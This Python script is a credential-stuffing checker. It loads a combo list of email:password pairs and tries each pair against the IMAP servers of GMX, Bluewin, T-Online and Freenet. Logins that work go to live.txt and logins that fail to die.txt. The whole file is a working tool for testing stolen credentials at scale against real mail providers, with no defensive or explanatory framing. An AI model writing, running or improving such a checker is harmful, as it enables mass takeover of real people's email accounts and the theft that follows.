import imaplib
import time
from termcolor import colored
from tkinter import filedialog, Tk

LIVE_FILE = "live.txt"
DIE_FILE = "die.txt"
def get_imap_server(email):
    """
    Extracts the domain name from the email address and returns
    the corresponding IMAP server.
    """

    domain = email.split("@")[1]
    if domain == "gmx.net":
        return "imap.gmx.net"
    if domain == "gmx.de":
        return "imap.gmx.net"
    if domain == "gmx.at":
        return "imap.gmx.net"
    if domain == "bluewin.ch":
        return "imaps.bluewin.ch"
    if domain == "gmx.ch":
        return "imap.gmx.net"
    if domain == "t-online.de":
        return "secureimap.t-online.de"
    if domain == "freenet.de":
        return "mx.freenet.de"
    else:
        return None

def login(email, password):
    """
    Logs into the IMAP server with the given email and password.
    Returns True if the login is successful, False otherwise.
    """
    server = get_imap_server(email)
    if server is None:
        return False

    try:
        imap = imaplib.IMAP4_SSL(server)
        imap.login(email, password)
        imap.logout()
        return True
    except:
        return False

# Prompt the user to select the email/password file using tkinter
root = Tk()
root.withdraw()  # Hide the tkinter window
file_path = filedialog.askopenfilename(title="Select email/password file")
root.destroy()  # Clean up the tkinter window

start_time = time.time()  # Record the start time

# Open the selected file and read in the lines
with open(file_path) as f:
    lines = f.readlines()

# Loop through each line (i.e. each email:password pair)
for line in lines:
    # Split the line into email and password
    email, password = line.strip().split(":")

    # Attempt to log in with the email and password
    if login(email, password):
        # If successful, print the email in green and write to the live file
        print(colored("LIVE: " + email, "green"))
        with open(LIVE_FILE, "a") as f:
            f.write(f"{email}:{password}\n")
    else:
        # If unsuccessful, print the email in red and write to the die file
        print(colored("DIE: " + email, "red"))
        with open(DIE_FILE, "a") as f:
            f.write(f"{email}:{password}\n")

end_time = time.time()  # Record the end time
elapsed_time = end_time - start_time  # Calculate the elapsed time
print(colored(f"\nElapsed time: {elapsed_time:.2f} seconds", "yellow"))  # Print the elapsed time
